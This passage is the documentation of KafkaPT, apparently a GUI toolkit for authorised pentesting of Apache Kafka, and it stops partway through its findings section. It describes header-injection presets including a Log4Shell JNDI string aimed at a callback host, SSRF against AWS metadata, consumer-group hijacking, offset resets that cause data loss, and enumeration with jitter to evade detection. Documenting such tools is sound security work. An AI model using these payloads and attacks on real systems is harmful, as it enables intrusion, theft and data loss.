# KafkaPT v2.5 — Kafka Pentest Toolkit

> **A desktop GUI for security testing Apache Kafka environments.**
> Built with Python 3.11+ and PyQt6. Designed for penetration testers, security researchers, and developers who need to audit Kafka deployments.

---

## Table of Contents

1. [Background — What is Apache Kafka?](#1-background--what-is-apache-kafka)
2. [What is Penetration Testing?](#2-what-is-penetration-testing)
3. [What is KafkaPT?](#3-what-is-kafkapt)
4. [What's New in v2.5](#4-whats-new-in-v25)
5. [Prerequisites](#5-prerequisites)
6. [Installation](#6-installation)
7. [Launching the Tool](#7-launching-the-tool)
8. [Interface Overview](#8-interface-overview)
9. [⚙ CONFIG Tab](#9--config-tab)
   - [SCHEMA](#91-schema-sub-tab)
   - [CERTIFICATES](#92-certificates-sub-tab)
   - [ENCRYPTION](#93-encryption-sub-tab)
   - [PROXY / BURP](#94-proxy--burp-sub-tab)
10. [RECON Tab](#10-recon-tab)
11. [ATTACK Tab](#11-attack-tab)
    - [HEADER INJECT](#111-header-inject)
    - [ACL BYPASS](#112-acl-bypass)
    - [OFFSET ATTACK](#113-offset-attack)
12. [CONNECT Tab](#12-connect-tab)
13. [READ Tab](#13-read-tab)
14. [SEND Tab](#14-send-tab)
15. [RANDOMIZE Tab](#15-randomize-tab)
16. [FINDINGS Tab](#16-findings-tab)
17. [Typical Pentest Workflow](#17-typical-pentest-workflow)
18. [Injection Presets Reference](#18-injection-presets-reference)
19. [Understanding Findings](#19-understanding-findings)
20. [Exporting Results](#20-exporting-results)
21. [Troubleshooting](#21-troubleshooting)
22. [Legal Disclaimer](#22-legal-disclaimer)

---

## 1. Background — What is Apache Kafka?

Apache Kafka is a **message broker** — a system that lets applications send and receive data between each other at high speed and scale. Think of it like an airport:

- **Topics** are gates — data flows through them.
- **Producers** are applications that *send* messages to a topic.
- **Consumers** are applications that *read* messages from a topic.
- **Brokers** are the Kafka servers that store and route messages.
- **Consumer Groups** are teams of consumers working together to process a topic.

Kafka is used in banks, healthcare platforms, e-commerce systems, and anywhere that requires reliable, high-throughput data pipelines. This also makes it a high-value target for security testing.

**Why Kafka security matters for a pentester:**

- Messages may contain PII, payment records, credentials, or API keys transmitted in plaintext.
- Misconfigured ACLs allow attackers to read or write to topics they shouldn't access.
- Message headers pass through to downstream systems without sanitisation — enabling Log4Shell, SSRF, and SSTI injection chains.
- Consumer group offsets can be manipulated to cause data loss or force message replay.
- Schema Registry endpoints expose the internal data structures of the organisation.
- Kafka Connect connectors may store database passwords and cloud credentials in their configs.

---

## 2. What is Penetration Testing?

Penetration testing (pentesting) is **authorised, controlled hacking**. A security professional is given written permission by the system owner to attack their systems in order to find vulnerabilities before a real attacker does.

A pentest always requires:
- **Written authorisation** (a scope document or statement of work).
- **Defined boundaries** (which systems can be tested, which cannot).
- A goal to **find, document, and help fix** weaknesses.

**Never use this tool against systems you do not have explicit written permission to test.**

---

## 3. What is KafkaPT?

KafkaPT v2.5 is a **desktop GUI tool** that wraps common Kafka penetration testing tasks into a visual interface, so you don't have to memorise command-line arguments or write custom scripts.

**Full capability list:**

| Area | Capability |
|---|---|
| **Authentication** | mTLS (client certificates), SASL PLAIN, SCRAM-SHA-256, SCRAM-SHA-512, combined SASL_SSL |
| **Reconnaissance** | Broker topology, topic enumeration, consumer group listing, ACL description |
| **Schema Registry** | Schema fetch by ID, brute-force ID enumeration with rate control and 429 back-off |
| **Data inspection** | Consume and decode messages (JSON, Avro, hex, base64); display Kafka headers |
| **Data injection** | Produce messages with custom JSON, Avro, or raw bytes; attach arbitrary headers |
| **Header injection** | 16 built-in payloads: Log4Shell, SSRF, SSTI, SQLi, XSS, XXE, command injection, path traversal |
| **ACL testing** | Unauthorised read/write attempts; ghost consumer group join |
| **Offset attacks** | Reset consumer group offsets to earliest/latest/specific (with confirmation) |
| **Burp Suite** | Route Schema Registry HTTP traffic through Burp; Collaborator URL substitution in payloads |
| **Collaborator polling** | Poll a self-hosted Burp Collaborator server for DNS/HTTP/SMTP callbacks; auto CRITICAL finding |
| **Kafka Connect** | Enumerate connectors, read configs, scan for credentials and embedded JDBC passwords |
| **Avro support** | Deserialise incoming messages with loaded schema; generate random valid Avro payloads |
| **Payload encryption** | AES-128/256-CBC/GCM, ChaCha20-Poly1305 with configurable IV modes |
| **Findings** | Automatic deduplication; severity levels CRITICAL/HIGH/MEDIUM/LOW/INFO; Markdown export |
| **Evidence export** | Messages exported as NDJSON; findings exported as Markdown report |

---

## 4. What's New in v2.5

If you used KafkaPT v2.0, here is a summary of every change.

### UI Fixes
- **`+` / `−` buttons now visible** in all header tables. The buttons were invisible in v2.0 due to a CSS padding conflict. Fixed with a dedicated `#btn_icon` stylesheet rule.
- **Font scaling** for HiDPI and 4K displays. A `Font` combo in the header bar lets you choose 100% / 125% / 150% / 175%. All CSS font sizes and widget fonts scale accordingly.
- **Redesigned layout** — the cramped 340 px top config section is gone. Everything now lives in a single tab bar. The first tab (`⚙ CONFIG`) contains all configuration sub-tabs, giving them full window height.

### New Security Features
- **SASL authentication** — PLAIN, SCRAM-SHA-256, and SCRAM-SHA-512 support in the CERTIFICATES tab. Works standalone (`SASL_PLAINTEXT`) or combined with mTLS (`SASL_SSL`). All Kafka workers (consumer, producer, recon, offset reset) accept SASL credentials.
- **Schema enumeration rate control** — configurable delay (0–10 000 ms) between requests, optional ±30% random jitter (stealth mode), automatic exponential back-off on HTTP 429 responses.
- **Finding deduplication** — identical findings from repeated operations are silently dropped.
- **Safe thread shutdown** — `QThread.terminate()` replaced with cooperative `_stop_flag` event; no more orphaned broker connections.
- **Burp Collaborator polling** — poll your self-hosted Collaborator server for interaction results. DNS, HTTP, and SMTP callbacks are automatically recorded as CRITICAL findings.
- **Kafka Connect panel** — a new `CONNECT` tab lets you enumerate connectors, fetch their full configs, scan for credentials, and list installed plugin classes.

---

## 5. Prerequisites

### What you need before installing

**1. Python 3.11 or newer**
```bash
python3 --version
```
Download from [python.org](https://www.python.org/downloads/) if needed.

**2. pip**
```bash
pip --version
```

**3. A Kafka environment to test** (with written authorisation)

For local testing without a real cluster, run Kafka via Docker:
```bash
docker run -d --name kafka -p 9092:9092 \
  -e KAFKA_CFG_NODE_ID=1 \
  -e KAFKA_CFG_PROCESS_ROLES=broker,controller \
  -e KAFKA_CFG_LISTENERS=PLAINTEXT://:9092,CONTROLLER://:9093 \
  -e KAFKA_CFG_LISTENER_SECURITY_PROTOCOL_MAP=CONTROLLER:PLAINTEXT,PLAINTEXT:PLAINTEXT \
  -e KAFKA_CFG_CONTROLLER_QUORUM_VOTERS=1@localhost:9093 \
  -e KAFKA_CFG_CONTROLLER_LISTENER_NAMES=CONTROLLER \
  bitnami/kafka:latest
```

**4. (Optional) Burp Suite Professional**
Required only for Collaborator polling. The free Community Edition is sufficient for HTTP interception of Schema Registry traffic. Download from [portswigger.net](https://portswigger.net/burp).

**5. (Optional) mTLS certificates**
If the broker requires mutual TLS, you need:
- `ca-cert.pem` — Certificate Authority
- `client-cert.pem` — your client certificate
- `client-key.pem` — your client private key

Ask the system owner for test credentials.

---

## 6. Installation

### Step 1 — Clone or download

```bash
git clone https://github.com/KarlitoQ/Kafka.git
cd kafkapt
```

### Step 2 — Create a virtual environment (recommended)

```bash
python3 -m venv venv

# Linux / macOS:
source venv/bin/activate

# Windows:
venv\Scripts\activate
```

### Step 3 — Install dependencies

```bash
pip install PyQt6 confluent-kafka fastavro requests cryptography
```

| Package | Purpose |
|---|---|
| `PyQt6` | Desktop GUI framework |
| `confluent-kafka` | Kafka broker connections (producer, consumer, admin) |
| `fastavro` | Avro message serialisation and deserialisation |
| `requests` | HTTP client for Schema Registry and Kafka Connect REST API |
| `cryptography` | AES and ChaCha20 payload encryption |

> **Linux users:** if PyQt6 raises errors about missing system libraries:
> ```bash
> sudo apt-get install libxcb-xinerama0 libxcb-icccm4 libxcb-image0 libxcb-keysyms1
> ```

### Step 4 — Verify

```bash
python3 -c "import PyQt6, confluent_kafka, fastavro, requests, cryptography; print('OK')"
```

---

## 7. Launching the Tool

```bash
python3 kafka-pt-v2.py
```

The window opens. Title bar shows **KafkaPT v2.5 // Kafka Pentest Toolkit**.

**Header controls (always visible):**

| Control | Description |
|---|---|
| **Font:** combo | Scale UI fonts: 100% (default), 125%, 150%, 175%. Use 125%+ on 4K/HiDPI screens. |
| **☀ LIGHT / ☾ DARK** | Toggle between dark and light colour theme. |

---

## 8. Interface Overview

KafkaPT uses a single tab bar across the full window width:

```
┌──────────────────────────────────────────────────────────────────────┐
│  KAFKAPT                                  Font: [100%▾]  [☀ LIGHT]  │
│  Kafka Pentest Toolkit / v2.5 / Sprint 0+1+2+3                       │
│──────────────────────────────────────────────────────────────────────│
│  ⚙ CONFIG │ RECON │ ATTACK │ CONNECT │ READ │ SEND │ RANDOMIZE │ FINDINGS │
│                                                                      │
│  (full window height — no cramped fixed-height panel)                │
└──────────────────────────────────────────────────────────────────────┘
```

**Recommended workflow order:** `⚙ CONFIG` → `RECON` → `ATTACK` → `CONNECT` → `READ` → `SEND` → `RANDOMIZE` → `FINDINGS`

---

## 9. ⚙ CONFIG Tab

The CONFIG tab wraps all four configuration sub-tabs in a dedicated panel. This is where you set up your connection settings **before** running any tests. The sub-tabs are accessible via a second row of smaller tabs inside the CONFIG panel.

---

### 9.1 SCHEMA Sub-tab

**What it is:** Connects to the Schema Registry — an HTTP service that stores the Avro data format (schema) for Kafka messages. Fetching a schema enables KafkaPT to decode Avro messages in the READ tab and encode them in the SEND tab.

**Why it matters for pentesting:** The Schema Registry is an HTTP service that Burp Suite can intercept. Its schema IDs can be brute-forced to discover data structures you were not explicitly given access to.

#### Fields and buttons:

| Field / Button | Description |
|---|---|
| **Registry URL** | Address of the Schema Registry, e.g. `http://schema-registry:8081` or `https://registry.internal:8443`. |
| **Schema ID** | The numeric ID to fetch. Start with `1` and increase until you find valid schemas. |
| **FETCH SCHEMA** | Downloads the schema with the given ID. The JSON appears in the output area below. If a schema loads, it is automatically used for Avro encoding/decoding in READ and SEND. |
| **Schema status** | Shows success, error, or progress. |
| **Enum IDs — from / to** | Range of schema IDs to scan automatically, e.g. `1` to `500`. |
| **Delay (ms)** | Milliseconds to wait between requests during enumeration. Set to 0 for maximum speed. Use 500–2000 ms to avoid detection or triggering rate limiting. |
| **Jitter** checkbox | Adds ±30% random variation to each delay. Combined with a delay, this makes the enumeration harder to detect. |
| **ENUMERATE** | Starts the brute-force scan. Found schemas appear in green in the output area. |
| **STOP** | Stops an enumeration in progress. |
| **Progress bar** | Shows how far through the ID range the enumeration has reached. |

> **Rate limiting (HTTP 429):** If the Schema Registry returns HTTP 429, KafkaPT automatically backs off using exponential delay (up to 60 seconds) and retries the same ID. A `[THROTTLED]` warning appears in the output.

---

### 9.2 CERTIFICATES Sub-tab

**What it is:** Configures mTLS (mutual TLS) certificates and SASL credentials for connecting to the Kafka broker and Schema Registry.

#### mTLS section:

| Field / Button | Description |
|---|---|
| **mTLS — Schema Registry** checkbox | Enable certificate authentication for Schema Registry HTTP requests. |
| **mTLS — Kafka Broker** checkbox | Enable certificate authentication for all broker connections (READ, SEND, RECON, ATTACK, CONNECT). |
| **CA Cert** | Path to the Certificate Authority `.pem` file. Used to verify the server's identity. Click **BROWSE**. |
| **Client Cert** | Path to your client certificate `.pem`. Proves your identity to the server. |
| **Client Key** | Path to your private key `.pem` corresponding to the client certificate. |
| **Key Passphrase** | Password for an encrypted private key. Leave empty if not required. |
| **Verify server certificate** | When checked (default), verifies the server's certificate against the CA. Uncheck for self-signed certificates. |

#### SASL section (new in v2.5):

| Field / Button | Description |
|---|---|
| **Enable SASL authentication** checkbox | Activates the SASL fields below. Can be used alone or together with mTLS. |
| **Mechanism** | `PLAIN`, `SCRAM-SHA-256`, or `SCRAM-SHA-512`. |
| **Username** | SASL username. |
| **Password** | SASL password (masked). |
| **Protocol hint label** | Dynamically shows the resulting security protocol: `SASL_PLAINTEXT` (SASL only) or `SASL_SSL` (SASL + mTLS). |

> **Pentest note:** If the broker accepts a connection with no certificates and no SASL credentials, that is a **HIGH** finding — the broker is unauthenticated.

---

### 9.3 ENCRYPTION Sub-tab

**What it is:** Configures application-level payload encryption. Used when the target system encrypts Kafka messages at the application layer (separate from TLS transport encryption).

Leave this as `None (Avro only)` unless you specifically know the target uses custom payload encryption.

| Field | Description |
|---|---|
| **Cipher Mode** | `None`, `AES-128-CBC`, `AES-256-CBC`, `AES-128-GCM`, `AES-256-GCM`, or `ChaCha20-Poly1305`. |
| **Shared Secret** | The encryption key (masked). Click **SHOW** to reveal. |
| **Key Encoding** | How the key is encoded: `hex`, `base64`, or `utf-8 raw`. |
| **IV / Nonce** | Initialisation vector handling: random per message (recommended), fixed, or prepended to ciphertext. |

---

### 9.4 PROXY / BURP Sub-tab

**What it is:** Routes Schema Registry HTTP traffic through Burp Suite for interception, and configures Burp Collaborator integration for detecting out-of-band callbacks from injection payloads.

#### HTTP Proxy section:

| Field / Button | Description |
|---|---|
| **Enable HTTP proxy** checkbox | When enabled, all Schema Registry HTTP requests go through the proxy URL. |
| **Proxy URL** | Burp's listening address. Default: `http://127.0.0.1:8080`. |
| **TEST** | Sends a test request to verify the proxy is running. |
| **Schema Registry** checkbox | Routes Schema Registry traffic through the proxy (always enabled when proxy is on). |
| **Collaborator URL** | Your Collaborator payload domain (e.g. `abc123.collab.internal`) — **without** `http://`. This is the domain used in injection payloads. When you select a Log4Shell preset, `COLLAB` is replaced with this value: `${jndi:ldap://abc123.collab.internal/a}`. |
| **Status label** | Shows whether the proxy is active and reachable. |

#### Collaborator Polling section (new in v2.5):

This polls your **self-hosted** Burp Collaborator server to automatically detect when an injection payload triggered a callback.

| Field / Button | Description |
|---|---|
| **Poll Server** | The address of your Collaborator server's polling endpoint, e.g. `http://collab.internal:9090`. This is **different** from the payload domain above — this is where KafkaPT sends polling requests. |
| **BIID** | The Burp Interaction ID (polling key). Obtain this from Burp Pro → Collaborator tab. It is typically the subdomain prefix of your Collaborator domain. |
| **Interval** | How often to poll, in seconds (5–300). Default is 30 seconds. |
| **START POLLING** | Starts background polling. KafkaPT continues operating normally while polling runs. |
| **STOP** | Stops the polling thread. |
| **Status label** | Shows the time of the last received callback, or current polling state. |

When a callback is received:
- A **CRITICAL** finding is automatically added to the FINDINGS tab.
- The finding includes: interaction type (DNS/HTTP/SMTP), client IP, interaction ID, and the raw request.
- You do not need to check Burp manually.

> **Important:** KafkaPT does not send any data to external services. Polling is sent only to your internal Collaborator server address. No traffic leaves your network.

---

## 10. RECON Tab

**What it is:** Connects to the Kafka broker and collects information about the environment — what brokers exist, what topics are visible, what consumer groups are active, and what ACL rules are in place.

**Run this first** before attempting any attacks. The information gathered here feeds directly into the ATTACK tab.

#### Fields and buttons:

| Field / Button | Description |
|---|---|
| **Broker** | Broker address, e.g. `kafka.internal:9093`. |
| **RUN ALL** | Runs all three phases (topology + groups + ACLs) in one click. Start here. |
| **FETCH TOPOLOGY** | Fetches brokers and topics using `Consumer.list_topics()`. Works without admin rights. |
| **LIST GROUPS** | Lists consumer groups via `AdminClient.list_consumer_groups()`. May require admin access. |
| **DESCRIBE ACLs** | Retrieves ACL rules via `AdminClient.describe_acls()`. Requires `DescribeConfigs` permission. If denied, the denial itself is displayed (this is expected for non-admin certificates). |
| **STOP** | Cleanly stops the running recon operation between phases. No broker connections are left open. |

#### TOPOLOGY sub-tab:
- **Left panel (Brokers):** Each broker's ID, hostname, and port.
- **Right panel (Topics):** Topic name and partition count. Internal topics (starting with `__`) are hidden.

#### GROUPS sub-tab:
Lists all consumer group IDs visible to your current certificate/credentials. Each group ID is a potential target for the GHOST JOIN attack.

#### ACLS sub-tab:
- Displays each ACL rule in structured format.
- Lines where `User:*` has `Allow` permissions are highlighted in **red** — this means every authenticated client can perform that operation regardless of their certificate.
- A warning label appears at the bottom if any wildcard ACLs are found.
- Wildcard ACLs automatically generate a **CRITICAL** finding.

> **Note:** "ACL enumeration denied — not authorized" is **normal and expected** for non-admin certificates. The broker is working correctly.

---

## 11. ATTACK Tab

**What it is:** Three categories of active attacks against Kafka. Use the information gathered in RECON to choose your targets.

> ⚠️ **Warning:** Actions in this tab can disrupt production services. The OFFSET ATTACK sub-tab can cause permanent data loss. Always obtain explicit written authorisation before using these features.

---

### 11.1 HEADER INJECT

**What it tests:** Whether malicious values in Kafka message headers reach downstream consumers without sanitisation. If a consumer processes a header value as a template, SQL query, or log entry, injection payloads can trigger remote code execution (Log4Shell), server-side request forgery, template injection, or SQL injection.

| Field / Button | Description |
|---|---|
| **Broker** | Broker address for this test. |
| **Topic** | Topic to publish the injected message to. |
| **Message body** | The JSON body of the message. Default `{"legit":"payload"}`. Leave as-is unless the consumer validates the body structure. |
| **Preset** dropdown | Select an injection type. The payload is applied to all header value cells. If no rows exist, default headers (`X-Correlation-ID`, `X-Request-ID`, `X-Forwarded-For`, `User-Agent`, `X-Event-Source`) are added automatically. |
| **+ button** | Add a new header row. |
| **− button** | Remove the selected header row. |
| **Header Name column** | The Kafka header name (e.g. `X-Trace-ID`, `User-Agent`). |
| **Header Value column** | The payload value. The `COLLAB` placeholder is replaced with your Collaborator URL from the CONFIG tab. |
| **INJECT** | Sends one message with all configured headers. A **HIGH** finding is added on successful delivery. |

**How to use HEADER INJECT:**
1. Set Broker and Topic.
2. In CONFIG → PROXY/BURP, confirm your Collaborator URL and start polling.
3. Click **+** to add a row (default name: `X-Correlation-ID`).
4. Select `Log4Shell — JNDI/LDAP` from the Preset dropdown.
5. Verify `COLLAB` was replaced in the value column.
6. Click **INJECT**.
7. Wait for a callback in the FINDINGS tab (polling will surface it automatically).

---

### 11.2 ACL BYPASS

**What it tests:** Whether your current certificate or credentials can access Kafka resources they should not be able to. The three tests are progressive in impact.

| Field / Button | Description |
|---|---|
| **Broker** | Broker address. |
| **Target topic** | A topic you should **not** have access to (discovered in RECON → TOPOLOGY). |
| **Ghost group ID** | A consumer group ID belonging to a legitimate service (from RECON → GROUPS). |
| **TEST READ** | Attempts to consume one message from the target topic. Success → **CRITICAL** finding. Failure → error message shows which ACL blocked it. |
| **TEST WRITE** | Attempts to produce a marker message to the target topic. Success → **CRITICAL** finding. |
| **GHOST JOIN** | Joins the specified consumer group on the target topic. If Kafka allows it, your client is assigned partitions — stealing messages from the legitimate service. A confirmation dialog appears before execution. Success → **CRITICAL** finding. |

---

### 11.3 OFFSET ATTACK

**What it tests:** Whether you can manipulate the stored read position of a consumer group, either causing messages to be processed twice (replay attack) or skipped entirely (data loss).

| Field / Button | Description |
|---|---|
| **Broker** | Broker address. |
| **Consumer Group** | The group whose offsets to reset (from RECON → GROUPS). |
| **Topic** | The topic in which to reset offsets. |
| **Reset to** | `earliest` — forces re-processing of all messages from the beginning. `latest` — skips all pending messages (data loss). `specific offset` — jumps to a specific offset number. |
| **Specific offset** spinner | Target offset number. Only active when "specific offset" is selected. |
| **EXECUTE OFFSET RESET** | Executes the reset. A mandatory confirmation dialog explains the consequences before proceeding. Success → **HIGH** finding. |

---

## 12. CONNECT Tab

**What it is:** An explorer for the Kafka Connect REST API (default port 8083). Kafka Connect connectors often contain sensitive configuration including database passwords, S3 secret keys, and JDBC connection strings with embedded credentials.

**Why this matters:** The Kafka Connect REST API is frequently left unauthenticated. Even when it is protected, connector configs retrieved with valid credentials may expose secrets that should have been stored in a vault.

#### Fields and buttons:

| Field / Button | Description |
|---|---|
| **Connect Server** | Address of the Kafka Connect REST API, e.g. `http://kafka-connect:8083`. |
| **Basic Auth** checkbox | Enables username/password authentication for the REST API requests. |
| **Username / Password** | Basic auth credentials (only active when Basic Auth is checked). |
| **Verify SSL** checkbox | Whether to verify the server's TLS certificate. Uncheck for self-signed certificates. |
| **LIST CONNECTORS** | `GET /connectors` — lists connector names. If the API responds without credentials, generates a **MEDIUM** finding (unauthenticated access). |
| **FULL SCAN** | Lists connectors AND fetches each connector's full config and status. Triggers credential scanning for each config. |
| **SHOW PLUGINS** | `GET /connector-plugins` — lists all installed connector plugin classes. |
| **STOP** | Stops an in-progress scan cleanly. |

#### Left panel — Connectors / Plugins tree:
- **CONNECTORS** node: lists each connector name with its current state badge (RUNNING in green, FAILED in red, PAUSED in amber).
- **PLUGINS** node (after SHOW PLUGINS): lists installed plugin class names and types.
- Click any connector to view its full configuration on the right.

#### Right panel — Configuration view:
- Displays the full JSON config of the selected connector.
- Lines containing credential-related keys are annotated `← [CREDENTIAL KEY]` automatically. Detected keywords include: `password`, `secret`, `api_key`, `token`, `credential`, `db.password`, `access_key`, `s3.secret.key`, and others.
- JDBC URLs with embedded passwords (e.g. `jdbc:mysql://user:pass@host:3306/db`) are annotated `← [EMBEDDED CRED IN URL]`.

**Auto-findings from CONNECT:**
- Unauthenticated API access → **MEDIUM**
- Credential keyword in config value → **HIGH**
- JDBC URL with embedded credentials → **HIGH**

---

## 13. READ Tab

**What it is:** A Kafka consumer. Reads messages from a topic and displays them in a human-readable format. Used to inspect what data is flowing through the target environment.

**Why useful for pentesting:** This is how you find PII, credentials, API keys, or other sensitive information flowing through Kafka topics in plaintext. KafkaPT automatically scans each message and adds findings.

#### Connection bar:

| Field | Description |
|---|---|
| **Broker** | Broker address. |
| **Topic** | Topic to read from. |
| **Consumer Group** | Group ID to use. Default `kafkapt-consumer`. Change if the topic requires a specific group. |

#### Options:

| Field | Description |
|---|---|
| **Start Offset** | `latest` — read only new messages. `earliest` — read from the very beginning (may be large). `specific` — start from a particular offset number. |
| **Max Messages** | How many messages to consume before stopping. Default 1. |

#### Buttons:

| Button | Description |
|---|---|
| **READ MESSAGE(S)** | Starts consuming. Messages appear in the left log pane as they arrive. |
| **STOP** | Stops consuming before reaching the message limit. |
| **CLEAR** | Clears all received messages from the display. |
| **EXPORT NDJSON** | Saves all received messages to a `.ndjson` file (one JSON per line). Each record includes topic, partition, offset, timestamp, headers, decoded value, and raw hex. |

#### Detail view (right panel):

Navigate between messages using **< PREV** and **NEXT >**.

| Control | Description |
|---|---|
| **Ignore schema** checkbox | Skip Avro decoding. Shows raw bytes in the selected format. |
| **Display as** | How to render the message value: `auto-detect` (tries JSON → UTF-8 → hex dump), `hex`, `hex dump`, `UTF-8 raw`, or `base64`. |
| **Show headers** checkbox | Shows Kafka message headers (if any) below the decoded value. |
| **COPY** | Copies the currently displayed message content to clipboard. |

**Auto-scanning:** KafkaPT automatically scans each message for credit card numbers (16-digit patterns), email addresses, and credential keywords (`password`, `token`, `api_key`, etc.). If found, a **HIGH** finding is added to the FINDINGS tab with the evidence.

---

## 14. SEND Tab

**What it is:** A Kafka producer. Sends messages to a topic with optional custom headers for injection testing.

#### Connection bar:

| Field | Description |
|---|---|
| **Broker** | Broker address. |
| **Topic** | Topic to publish to. |
| **Message Key** | Optional partition key. Leave empty for random partition assignment. |

#### Payload options:

| Control | Description |
|---|---|
| **Payload Source** | `Manual JSON` — type payload below. `From Randomizer` — generate a fresh random Avro payload per message. `From Reader (replay)` — paste a message captured from the READ tab. |
| **Ignore schema** checkbox | Send raw bytes without Avro serialisation. |
| **Encoding** (raw mode) | `UTF-8`, `hex`, or `base64`. How KafkaPT interprets your raw input. |
| **Payload editor** | Type or paste your JSON payload here. |

#### Kafka Headers section:

This is the same injection header table as in ATTACK → HEADER INJECT. Attach any number of headers to every outgoing message:
- Use **Preset** to fill all header values with a payload template.
- Use **+** / **−** to add or remove header rows.
- `COLLAB` in preset values is replaced with your Collaborator URL from CONFIG.

#### Send controls:

| Control | Description |
|---|---|
| **SEND MESSAGE** | Sends the message. Delivery confirmation appears in the log below. |
| **Repeat** checkbox | Send the same message multiple times. |
| **Repeat count** | How many times to send. |
| **Sent count** | Running total of successfully delivered messages this session. |

The delivery log shows `topic`, `partition`, and `offset` for each delivered message, or the error if delivery failed.

---

## 15. RANDOMIZE Tab

**What it is:** Generates random but schema-valid Avro payloads. Useful for fuzz testing and for producing test messages when you need valid data but don't want to craft it manually.

**First load a schema** in CONFIG → SCHEMA before using this tab. KafkaPT reads the schema structure and produces realistic random values for every field.

**Supported Avro types:** null, boolean, int, long, float, double, string, bytes, array, map, enum, union, fixed, and logical types (uuid, date, time-millis, time-micros, timestamp-millis, timestamp-micros, decimal).

| Button | Description |
|---|---|
| **GENERATE RANDOM PAYLOAD** | Produces one valid random JSON payload based on the loaded schema. |
| **COPY JSON** | Copies the generated JSON to clipboard. |
| **CLEAR** | Clears the display and resets the count. |

In the SEND tab, set **Payload Source** to `From Randomizer`. KafkaPT then generates a fresh random payload for each message sent, serialises it with Avro, and wraps it in the Confluent wire format (magic byte + schema ID).

---

## 16. FINDINGS Tab

**What it is:** A centralised log of every vulnerability and observation recorded during the test session. Findings are added automatically by other tabs — you do not need to manually enter them.

**Deduplication:** If the same finding is triggered multiple times (e.g. sending 20 injection messages to the same topic), only the first occurrence is recorded.

#### Severity levels:

| Severity | Colour | Meaning |
|---|---|---|
| **CRITICAL** | Red | Immediate serious risk. Wildcard ACLs, ACL bypass, ghost consumer, Collaborator callbacks. |
| **HIGH** | Orange | Significant risk. PII in plaintext, credential in Connect config, injection delivered, offset manipulation. |
| **MEDIUM** | Yellow | Moderate risk. Unauthenticated Kafka Connect API, sensitive schema structure exposed. |
| **LOW** | Green | Minor issues. Informational exposure with limited impact. |
| **INFO** | Teal | Observations. Topics discovered, groups enumerated, schemas found. |

#### Controls:

| Button | Description |
|---|---|
| **MARK FALSE POSITIVE** | Marks the selected finding as a false positive. It remains in the list and report but is noted as `[FP]`. |
| **EXPORT MARKDOWN** | Saves all findings to a `.md` file sorted by severity. Use this to generate your pentest report. |
| **CLEAR ALL** | Permanently deletes all findings (requires confirmation). |

#### Left panel — Findings list:
Sorted by severity (CRITICAL first). Columns: Severity, Title, Phase, Time.

#### Right panel — Detail view:
Full details of the selected finding: severity, title, phase, timestamp, full description explaining the risk, and raw evidence.

#### Phases explained:

| Phase | What generated it |
|---|---|
| `recon` | Topic/group/schema enumeration |
| `authz` | ACL tests, offset reset, ghost consumer |
| `injection` | Header injection, Collaborator callbacks |
| `data` | PII/credential scanner in READ, Connect credential scan |
| `infra` | Unauthenticated Connect API |

---

## 17. Typical Pentest Workflow

Follow this order for a complete Kafka pentest:

### Phase 1 — Configure (⚙ CONFIG tab)

1. Open CONFIG → **CERTIFICATES**. Enable mTLS for broker (and Schema Registry if needed). Browse and select your certificate files. Enable SASL if required.
2. Open CONFIG → **PROXY/BURP**. Enable HTTP proxy if routing through Burp. Set your Collaborator domain. Set your Poll Server address and BIID, then click **START POLLING**.
3. Open CONFIG → **SCHEMA**. Enter the Schema Registry URL. Fetch schema ID `1`.

### Phase 2 — Reconnaissance (RECON tab)

4. Enter the broker address. Click **RUN ALL**.
5. Note all topic names in TOPOLOGY.
6. Note all consumer group IDs in GROUPS.
7. Check ACLS for red (wildcard) entries.
8. Back in SCHEMA: try IDs 1–5 manually, then enumerate range 1–200.

### Phase 3 — Data Security (READ tab)

9. Enter broker, topic (from step 5), group `kafkapt-consumer`.
10. Set offset `earliest`, max messages `20`. Click **READ MESSAGE(S)**.
11. Review messages in the detail panel for sensitive content.
12. Click **EXPORT NDJSON** to capture evidence.

### Phase 4 — Injection (ATTACK → HEADER INJECT)

13. Enter broker and a topic you can write to.
14. Add headers with **+**. Select `Log4Shell — JNDI/LDAP` preset.
15. Click **INJECT**. Monitor FINDINGS for Collaborator callbacks.
16. Repeat with `SSRF — AWS metadata` and `SSTI — Jinja2` presets.
17. Vary the header names (`User-Agent`, `X-Forwarded-For`, `X-Trace-ID`).

### Phase 5 — Authorisation (ATTACK → ACL BYPASS)

18. Enter a topic from RECON that you should not have access to.
19. Click **TEST READ**. Note the result.
20. Click **TEST WRITE**. Note the result.
21. Enter a group ID from RECON. Click **GHOST JOIN** (confirm the dialog).

### Phase 6 — Kafka Connect (CONNECT tab)

22. Enter the Connect server URL (try port 8083).
23. Click **LIST CONNECTORS** (no credentials first to test unauthenticated access).
24. Click **FULL SCAN** to fetch all configs and scan for credentials.
25. Click each connector in the tree to review its annotated config.

### Phase 7 — Report (FINDINGS tab)

26. Review all findings. Mark any false positives.
27. Click **EXPORT MARKDOWN** to generate the report.

---

## 18. Injection Presets Reference

| Preset | Attack type | What it detects |
|---|---|---|
| `Log4Shell — JNDI/LDAP` | Remote code execution | Log4j2 processing the header makes an outbound LDAP request to Collaborator |
| `Log4Shell — JNDI/RMI` | Remote code execution | Same via RMI protocol |
| `Log4Shell — JNDI/DNS` | Out-of-band detection | DNS-only Log4Shell check — simpler, harder to block |
| `SSTI — Jinja2` | Template injection | Jinja2 evaluates `{{7*7}}` → response contains `49` |
| `SSTI — FreeMarker` | Template injection | FreeMarker evaluates `${7*7}` |
| `SQLi — Error-based` | SQL injection | Database returns an error containing version info |
| `SQLi — Union` | SQL injection | Union-based data extraction |
| `XSS — Script tag` | Cross-site scripting | Header value reflected unsanitised in a web UI |
| `XSS — Img onerror` | Cross-site scripting | Alternative XSS vector |
| `Command Injection` | OS command injection | Value passed to `exec()` or shell without sanitisation |
| `Path Traversal` | Directory traversal | Value reaches a filesystem path operation |
| `SSRF — AWS metadata` | Server-side request forgery | Processing server fetches AWS instance metadata |
| `SSRF — Internal` | SSRF | Internal Spring Boot actuator exposed |
| `XXE` | XML external entity | XML parser processes external entity |
| `Null byte` | Input sanitisation | Null byte causes truncation or unexpected branching |
| `Large value (1 KB)` | Buffer / DoS testing | 1 KB header value triggers errors or truncation |

**COLLAB substitution:** Set your Collaborator domain in CONFIG → PROXY/BURP. When you apply a preset, `COLLAB` is replaced:
```
${jndi:ldap://COLLAB/a}  →  ${jndi:ldap://abc123.collab.internal/a}
```

---

## 19. Understanding Findings

Each finding contains:

| Field | Description |
|---|---|
| **Severity** | CRITICAL / HIGH / MEDIUM / LOW / INFO |
| **Title** | Short description of what was found |
